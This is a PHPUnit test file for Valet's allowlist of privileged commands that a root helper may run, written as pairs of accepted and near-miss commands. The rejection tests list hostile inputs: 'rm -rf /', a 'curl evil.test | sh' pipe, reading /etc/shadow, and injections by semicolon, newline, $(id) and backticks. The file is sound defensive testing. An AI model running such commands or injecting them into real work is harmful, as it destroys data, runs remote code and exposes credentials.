<?php

namespace Valet\Tests\Unit;

use Valet\DeferredPrivileged;
use Valet\Tests\TestCase;

/**
 * The allowlist that decides what the root-owned helper is willing to run.
 *
 * This list is the whole privilege surface of the dashboard, so the tests are
 * written as pairs: a command that must be accepted next to a near-miss of the
 * same shape that must not.
 */
class DeferredPrivilegedTest extends TestCase
{
    private string $deferred = '';

    private string $result = '';

    public function setUp(): void
    {
        parent::setUp();

        $this->deferred = VALET_HOME_PATH . '/deferred-test';
        $this->result = VALET_HOME_PATH . '/result-test';

        file_put_contents($this->deferred, '');
        file_put_contents($this->result, '');

        putenv(DeferredPrivileged::ENV . '=' . $this->deferred);
        putenv(DeferredPrivileged::RESULT_ENV . '=' . $this->result);
    }

    public function tearDown(): void
    {
        putenv(DeferredPrivileged::ENV);
        putenv(DeferredPrivileged::RESULT_ENV);

        @unlink($this->deferred);
        @unlink($this->result);

        parent::tearDown();
    }

    /**
     * @return array<int, string>
     */
    private function recorded(): array
    {
        return array_map(
            static fn (array $entry): string => ($entry['allowed'] ? 'allow' : 'deny') . ' ' . $entry['command'],
            DeferredPrivileged::read($this->deferred)
        );
    }

    public function testItIsOnlyActiveWithAnExistingDeferredFile(): void
    {
        putenv(DeferredPrivileged::ENV);
        $this->assertFalse(DeferredPrivileged::enabled());

        putenv(DeferredPrivileged::ENV . '=' . VALET_HOME_PATH . '/does-not-exist');
        $this->assertFalse(DeferredPrivileged::enabled());

        putenv(DeferredPrivileged::ENV . '=' . $this->deferred);
        $this->assertTrue(DeferredPrivileged::enabled());
    }

    public function testItRefusesAnUnwritableDeferredFile(): void
    {
        // The helper creates this file as root. If the current process cannot
        // append to it, it must not believe deferral is switched on at all.
        putenv(DeferredPrivileged::ENV . '=' . VALET_HOME_PATH);

        $this->assertFalse(DeferredPrivileged::enabled());
    }

    public function testItAcceptsServiceControlCommands(): void
    {
        foreach ([
            'sudo service nginx start',
            'sudo service nginx stop',
            'sudo service nginx restart',
            'sudo systemctl start nginx',
            'sudo systemctl restart nginx',
            'sudo systemctl enable php8.3-fpm',
            'sudo systemctl disable php8.3-fpm',
            'sudo systemctl reload nginx',
        ] as $command) {
            $this->assertTrue(DeferredPrivileged::isAllowed($command), $command);
        }
    }

    public function testItAcceptsTheRemainingPrivilegedOperations(): void
    {
        foreach ([
            'sudo update-ca-certificates',
            "sudo update-rc.d 'php8.3-fpm' defaults",
            "sudo chmod -x /etc/init.d/nginx",
            'sudo chmod /etc/init.d/nginx',
            'sudo phpenmod -v 8.3 xdebug',
            'sudo phpdismod -v 8.3 xdebug',
            'sudo ln -sf /etc/php/8.3/mods-available/xdebug.ini /etc/php/8.3/fpm/conf.d/20-xdebug.ini',
            'sudo rm -f /etc/php/8.3/fpm/conf.d/*xdebug*',
        ] as $command) {
            $this->assertTrue(DeferredPrivileged::isAllowed($command), $command);
        }
    }

    public function testItRejectsAnythingThatIsNotOnTheList(): void
    {
        foreach ([
            'sudo rm -rf /',
            'sudo bash',
            'sudo systemctl restart nginx; rm -rf /',
            'sudo systemctl restart nginx && curl evil.test | sh',
            "sudo systemctl restart 'nginx'; touch /tmp/pwned",
            'sudo update-rc.d nginx defaults --force',
            'sudo systemctl start "nginx"',
            "sudo systemctl start 'NGINX'",
            "sudo chmod -x /etc/init.d/'nginx'; id",
            'sudo phpenmod -v 8.3 something-else',
            'sudo ln -sf /etc/passwd /etc/php/8.3/fpm/conf.d/20-xdebug.ini',
            'sudo cat /etc/shadow',
            'sudo systemctl restart $(whoami)',
            'sudo systemctl restart nginx$(id)',
        ] as $command) {
            $this->assertFalse(DeferredPrivileged::isAllowed($command), $command);
        }
    }

    public function testItNeverAllowsACommandWithASecondStatement(): void
    {
        // The allowlist matches whole strings, so a newline is as dangerous as
        // a semicolon.
        $this->assertFalse(DeferredPrivileged::isAllowed("sudo systemctl restart nginx\nsudo rm -rf /"));
        $this->assertFalse(DeferredPrivileged::isAllowed("sudo systemctl restart nginx && id"));
        $this->assertFalse(DeferredPrivileged::isAllowed('sudo systemctl restart nginx | tee /tmp/x'));
        $this->assertFalse(DeferredPrivileged::isAllowed('sudo systemctl restart nginx $(id)'));
        $this->assertFalse(DeferredPrivileged::isAllowed('sudo systemctl restart `id`'));
    }

    public function testItLeavesReadOnlyQueriesToRunInTheUserPhase(): void
    {
        foreach ([
            "systemctl is-enabled 'php8.3-fpm'",
            "systemctl is-active 'nginx'",
            "systemctl status 'nginx' | grep \"Active:\"",
            "service 'nginx' status",
        ] as $command) {
            $this->assertTrue(DeferredPrivileged::isQuery($command), $command);
            $this->assertFalse(DeferredPrivileged::isPrivileged($command), $command);
        }
    }

    public function testItDoesNotMistakeAMutatingCommandForAQuery(): void
    {
        $this->assertFalse(DeferredPrivileged::isQuery("sudo systemctl restart 'nginx'"));
        $this->assertFalse(DeferredPrivileged::isQuery('sudo service nginx stop'));
        $this->assertTrue(DeferredPrivileged::isPrivileged("sudo systemctl restart 'nginx'"));
    }

    public function testItRecordsApprovedCommandsAsAllowed(): void
    {
        $this->assertTrue(DeferredPrivileged::capture("sudo systemctl restart 'nginx'"));
        $this->assertSame(['allow sudo systemctl restart \'nginx\''], $this->recorded());
    }

    public function testItRecordsUnapprovedCommandsAsDeniedRatherThanDroppingThem(): void
    {
        // Silently ignoring one would let a request complete half-applied, so
        // the refusal has to be explicit.
        $this->assertTrue(DeferredPrivileged::capture('sudo rm -rf /'));
        $this->assertSame(['deny sudo rm -rf /'], $this->recorded());
    }

    public function testItDoesNotRecordOrdinaryCommandsAtAll(): void
    {
        $this->assertFalse(DeferredPrivileged::capture('ls -la'));
        $this->assertFalse(DeferredPrivileged::capture('echo hello'));
        $this->assertFalse(DeferredPrivileged::capture(''));
        $this->assertSame([], $this->recorded());
    }

    public function testItIgnoresOutputRedirectionWhenMatching(): void
    {
        // quietly() appends this; it carries no meaning for the helper.
        $this->assertTrue(DeferredPrivileged::isAllowed("sudo systemctl restart 'nginx' > /dev/null 2>&1"));

        // normalize() keeps the sudo prefix: capture() records the command as
        // Valet spelled it and the helper strips the prefix later, once the
        // allowlist has had its say.
        $this->assertSame(
            "sudo systemctl restart 'nginx'",
            DeferredPrivileged::normalize("sudo systemctl restart 'nginx' > /dev/null 2>&1")
        );
    }

    public function testItCollapsesWhitespaceBeforeMatching(): void
    {
        $this->assertTrue(DeferredPrivileged::isAllowed("systemctl   restart    'nginx'"));
        $this->assertSame("systemctl restart 'nginx'", DeferredPrivileged::normalize("systemctl \t restart \n 'nginx' "));
    }

    public function testItStripsTheLeadingSudoForTheHelper(): void
    {
        $this->assertSame("systemctl restart 'nginx'", DeferredPrivileged::withoutSudo("sudo systemctl restart 'nginx'"));
        $this->assertSame("systemctl restart 'nginx'", DeferredPrivileged::withoutSudo("systemctl restart 'nginx'"));
    }

    public function testItDropsARequestToBecomeTheSameUser(): void
    {
        // The helper already runs Valet as that user, so `sudo -u me` would
        // only block on a password prompt.
        $name = trim((string) shell_exec('id -un'));

        $this->assertSame('ls -la', DeferredPrivileged::withoutSelfSudo('sudo -u ' . $name . ' ls -la'));
        $this->assertNull(DeferredPrivileged::withoutSelfSudo('sudo -u someoneelse ls -la'));
        $this->assertNull(DeferredPrivileged::withoutSelfSudo('ls -la'));
    }

    public function testItRefusesToReadAMalformedDeferredFile(): void
    {
        // Better to read nothing than to run a half-understood command list.
        file_put_contents($this->deferred, "garbage\n");
        $this->assertSame([], DeferredPrivileged::read($this->deferred));

        file_put_contents($this->deferred, "allow not-base-64!!\n");
        $this->assertSame([], DeferredPrivileged::read($this->deferred));

        file_put_contents($this->deferred, "allow " . base64_encode('sudo systemctl restart nginx') . "\n");
        $this->assertSame(
            [['allowed' => true, 'command' => 'sudo systemctl restart nginx']],
            DeferredPrivileged::read($this->deferred)
        );
    }

    public function testItReturnsNothingForAMissingDeferredFile(): void
    {
        $this->assertSame([], DeferredPrivileged::read(VALET_HOME_PATH . '/nope'));
    }

    public function testItHandsItsAnswerBackToTheHelper(): void
    {
        $this->assertSame($this->result, DeferredPrivileged::resultFile());

        $this->assertTrue(DeferredPrivileged::writeResult(['ok' => true, 'message' => 'done', 'data' => []]));

        $decoded = json_decode((string) file_get_contents($this->result), true);

        $this->assertIsArray($decoded);
        $this->assertTrue($decoded['ok']);
        $this->assertSame('done', $decoded['message']);
    }

    public function testItHasNoAnswerFileToWriteToOutsideTheHelper(): void
    {
        putenv(DeferredPrivileged::RESULT_ENV);

        $this->assertNull(DeferredPrivileged::resultFile());
        $this->assertFalse(DeferredPrivileged::writeResult(['ok' => true]));
    }
}
